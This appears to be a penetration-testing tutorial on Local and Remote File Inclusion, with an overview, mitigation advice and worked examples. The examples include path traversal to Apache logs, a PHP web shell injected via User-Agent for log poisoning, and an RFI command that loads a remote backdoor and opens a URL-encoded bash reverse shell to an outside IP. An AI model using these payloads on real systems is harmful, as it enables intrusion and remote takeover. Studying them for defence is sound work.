# File Inclusion Vulnerabilities: LFI and RFI RCE with URL encoding

## Technical Executive Summary
        

            Saverity: Medium - Critical 
                Depends on the content that you can display

    File Inclusion vulnerabilities, including Local File Inclusion (LFI) and Remote File Inclusion (RFI), are critical security issues that can lead to severe consequences such as unauthorized access, data breaches,     and remote code execution. These vulnerabilities arise when a web application allows the inclusion of files without proper validation and sanitization of user inputs.
    Local File Inclusion (LFI)

    LFI occurs when a web application includes files from the local server's filesystem. This can be exploited to read sensitive files, execute code, and gain unauthorized access to the system. One common technique         to exploit LFI is through Log Poisoning, where malicious code is injected into log files that are later included by the web application.
    Remote File Inclusion (RFI)

    RFI is a more dangerous variant that allows the inclusion of files from remote servers. This can lead to remote code execution by including and executing malicious scripts hosted externally. Exploiting RFI            typically involves hosting a malicious file and crafting a URL to include it in the vulnerable web application.
    Exploitation Techniques

    Identifying Vulnerabilities: Penetration testers use various techniques and tools to identify LFI and RFI vulnerabilities, such as fuzzing and analyzing HTTP responses.
    Log Poisoning: For LFI, testers inject malicious payloads into log files or other writable files on the server to execute code.
    Crafting Exploit URLs: For RFI, testers prepare and host malicious files on remote servers and craft URLs to include these files in the web application.

# Mitigation Strategies

To mitigate these vulnerabilities, web developers should:

    Validate and sanitize all user inputs.
    Disable unnecessary features like allow_url_include in PHP.
    Implement strict access controls to sensitive files and directories.
    Regularly update and patch web application frameworks and libraries.

# Role of Penetration Testers

Penetration testers play a crucial role in identifying and mitigating file inclusion vulnerabilities. By simulating real-world attack scenarios, they help organizations understand their security posture and implement effective countermeasures. Testers use a combination of manual techniques and automated tools to discover vulnerabilities and provide actionable recommendations for remediation.
Conclusion
File Inclusion vulnerabilities pose a significant risk to web applications and can lead to devastating security breaches if not properly addressed. Understanding the mechanisms behind LFI and RFI, along with employing robust security practices, is essential for protecting web applications from these attacks. Penetration testers provide valuable insights and expertise in identifying and mitigating these vulnerabilities, ensuring the security and integrity of web systems.



## Local File Inclusion (LFI)

### Overview

Local File Inclusion (LFI) vulnerabilities allow attackers to include files from the server's filesystem into the running code of a web application. This can lead to Remote Code Execution (RCE) if the included files contain executable code.

### Difference Between LFI and Directory Traversal

- **Directory Traversal**: Allows reading files outside the web root directory.
- **File Inclusion**: Allows including and potentially executing files within the web application's running code.

### Exploiting LFI with Log Poisoning

#### Step-by-Step Example

1. **Identify the Vulnerability**: Find a vulnerable parameter in the web application that accepts file paths.
2. **Modify Log Entries**: Use tools like `curl` to send data to the web application that gets logged.
3. **Include the Log File**: Use the LFI vulnerability to include the modified log file, executing the payload.

#### Practical Example

```bash
kali@kali:~$ curl http://example.com/malek/index.php?page=../../../../../../../../../var/log/apache2/access.log
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```
Modify the User Agent in Burp Suite to include a PHP code snippet:
```bash
<?php echo system($_GET['cmd']); ?>
```
Send the modified request and include the log file:
```bash
../../../../../../../../../var/log/apache2/access.log&cmd=ps
```
Output Example
```bash
www-data@fbea640f9802:/var/www/html/malek$ ls
admin.php
bavarian.php
css
fonts
img
index.php
js
```
# Remote File Inclusion (RFI)
## Overview

Remote File Inclusion (RFI) vulnerabilities allow attackers to include files from remote servers. This can be more dangerous than LFI because it allows attackers to execute code from external sources.
Exploiting RFI
Step-by-Step Example

    Identify the Vulnerability: Find a vulnerable parameter in the web application that accepts file paths.
    Host a Malicious File: Prepare and host a malicious PHP file on a remote server.
    Craft the Exploit URL: Include the remote file in the vulnerable parameter and pass commands to it.

Practical Example
```bash
curl "http://example.com/meteor/index.php?page=http://192.168.45.184/backdoor.php&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.184%2F4444%200%3E%261%22"
```

### Conclusion

By understanding and exploiting RFI vulnerabilities, attackers can include and execute remote files on a target system, leading to severe security breaches. Proper security measures, such as disabling allow_url_include and validating input parameters, are essential to prevent such attacks.


